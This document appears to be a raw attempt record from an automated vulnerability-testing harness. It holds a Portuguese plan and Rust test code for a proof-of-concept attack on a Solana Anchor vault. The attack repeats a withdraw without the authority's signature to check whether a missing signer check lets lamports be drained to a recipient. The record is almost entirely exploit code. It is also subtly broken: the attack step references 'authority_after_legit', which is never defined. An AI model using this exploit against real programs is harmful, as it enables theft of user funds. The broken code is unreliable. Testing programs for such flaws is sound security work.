attempts.raw:
{
  "plan": "Inicializamos um vault PDA com autoridade legitima e depositamos lamports para dar saldo. O uso legitimo e um withdraw assinado pela autoridade, que deve ter sucesso. O ataque repete o withdraw sem a assinatura da autoridade, mantendo o mesmo vault e recipient. Medimos se os lamports do vault diminuem e os do recipient aumentam, demonstrando a execucao sem signer.",
  "scenario": "let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();
let (vault_pda, _bump) = Pubkey::find_program_address(&[b"vault", authority.as_ref()], &env.program_id);

let init_ix = env.anchor_ix(
    "initialize",
    &(),
    vec![
        AccountMeta::new(vault_pda, false),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);
let init_accounts = vec![
    (vault_pda, empty_account()),
    (authority, wallet(1_000_000_000)),
    system_program_account(),
];
let init_res = env.baseline("initialize vault", &init_ix, &init_accounts);
assert!(init_res.program_result == ProgramResult::Success);

let vault_after_init = after(&init_res, &vault_pda).clone();
let authority_after_init = after(&init_res, &authority).clone();

let deposit_amount: u64 = 500_000_000;
let deposit_ix = env.anchor_ix(
    "deposit",
    &deposit_amount,
    vec![
        AccountMeta::new(vault_pda, false),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);
let deposit_accounts = vec![
    (vault_pda, vault_after_init.clone()),
    (authority, authority_after_init.clone()),
    system_program_account(),
];
let deposit_res = env.baseline("deposit into vault", &deposit_ix, &deposit_accounts);
assert!(deposit_res.program_result == ProgramResult::Success);

let vault_after_deposit = after(&deposit_res, &vault_pda).clone();
let authority_after_deposit = after(&deposit_res, &authority).clone();
let recipient_account = wallet(1_000_000);

let withdraw_amount: u64 = 100_000_000;
let legit_withdraw_ix = env.anchor_ix(
    "withdraw",
    &withdraw_amount,
    vec![
        AccountMeta::new(vault_pda, false),
        AccountMeta::new_readonly(authority, true),
        AccountMeta::new(recipient, false),
    ],
);
let legit_withdraw_accounts = vec![
    (vault_pda, vault_after_deposit.clone()),
    (authority, authority_after_deposit.clone()),
    (recipient, recipient_account.clone()),
];
let legit_res = env.baseline("legit withdraw signed by authority", &legit_withdraw_ix, &legit_withdraw_accounts);
assert!(legit_res.program_result == ProgramResult::Success);

let vault_after_legit = after(&legit_res, &vault_pda).clone();
let recipient_after_legit = after(&legit_res, &recipient).clone();

let attack_withdraw_ix = env.anchor_ix(
    "withdraw",
    &withdraw_amount,
    vec![
        AccountMeta::new(vault_pda, false),
        AccountMeta::new_readonly(authority, false),
        AccountMeta::new(recipient, false),
    ],
);
let attack_accounts = vec![
    (vault_pda, vault_after_legit.clone()),
    (authority, authority_after_legit.clone()),
    (recipient, recipient_after_legit.clone()),
];
let attack_res = env.attack("withdraw without authority signature", &attack_withdraw_ix, &attack_accounts);

if attack_res.program_result == ProgramResult::Success {
    let vault_after_attack = after(&attack_res, &vault_pda);
    let recipient_after_attack = after(&attack_res, &recipient);
    let vault_lamports_before = vault_after_legit.lamports();
    let recipient_lamports_before = recipient_after_legit.lamports();
    env.effect(
        "vault lamports decreased without authority signature",
        vault_after_attack.lamports() == vault_lamports_before - withdraw_amount,
    );
    env.effect(
        "recipient lamports increased without authority signature",
        recipient_after_attack.lamports() == recipient_lamports_before + withdraw_amount,
    );
}"
}

